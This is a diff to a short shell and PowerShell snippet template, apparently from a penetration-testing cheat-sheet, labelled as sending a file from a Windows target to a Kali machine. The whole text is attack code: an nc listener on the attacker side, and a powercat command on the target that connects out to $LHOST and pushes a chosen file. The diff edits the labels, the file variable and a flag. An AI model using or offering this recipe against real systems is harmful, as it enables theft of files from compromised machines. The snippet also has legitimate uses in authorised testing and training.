@@ -1,6 +1,6 @@
-# description: Windows sends file to Kali with Kali-side nc listener
-# stage: Kali shell: receive file
-RFILE="$rfile"
+# description: Windows sends file to Kali; Kali listens and target connects
+# stage: Kali shell: receive file from target
+RFILE="${file:t}"
 rm -f "$RFILE"
 nc -lvnp $lport > "$RFILE"
 
@@ -8,4 +8,4 @@ nc -lvnp $lport > "$RFILE"
 $LHOST = "$lhost"
 $PORT = $lport
 $FILE = "$file"
-powercat -c $LHOST -p $PORT -i $FILE
+powercat -c $LHOST -p $PORT -i $FILE -d
